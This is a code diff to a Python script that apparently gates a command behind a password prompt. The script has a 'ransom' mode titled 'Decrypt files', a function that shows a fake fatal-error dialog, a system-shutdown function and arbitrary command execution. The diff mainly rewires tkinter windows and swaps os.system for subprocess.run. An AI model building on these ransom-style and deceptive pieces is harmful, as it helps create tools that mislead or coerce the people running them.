@@ -13,11 +13,15 @@ alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="
 
 encryption_key = "change/me/to/whatever/you/want"
 
+
+root = tkinter.Tk()
+#root.withdraw()
+
 class PasswordWindow:
     def __init__(self, ransom=False):
 
         self.password = ""
-        self.master = tkinter.Tk()
+        self.master = root
         title = "Password Input"
         if ransom:
             title = "Decrypt files"
@@ -93,17 +97,17 @@ def decrypt(encoded):
 def exit1(trail):
     """Runs a completely different command."""
     os.system(trail)
-    exit()
 
 def exit2():
     """Displays a fake fatal error."""
+    root = tkinter.Tk()
+    root.withdraw()
     code = random.randint(-673, 897)
     if platform.system() != "Darwin":
         messagebox.showerror(title="Fatal Error", message="A fatal error was encountered while trying to run the program.\n\nError code: -705")
     else:
         subprocess.check_output("""osascript -e 'set theDialogText to "A fatal error was encountered while trying to run the program.\n\nError code: -705"
 display dialog theDialogText with title "Fatal Error" with icon stop'""", shell=True)
-    exit(code)
 
 def exit3():
     """Shuts down the system. Use with caution."""
@@ -126,7 +130,7 @@ if len(sys.argv) == 2:
         raise AssertionError
     win = PasswordWindow(ransom=params["ransom"])
     if hashlib.sha256(win.password.encode("utf-8")).hexdigest() == params["password"]:
-        os.system(params["command"])
+        subprocess.run(params["command"])
     else:
         if params["exit"] == "4":
             exitfunc(params["command"])
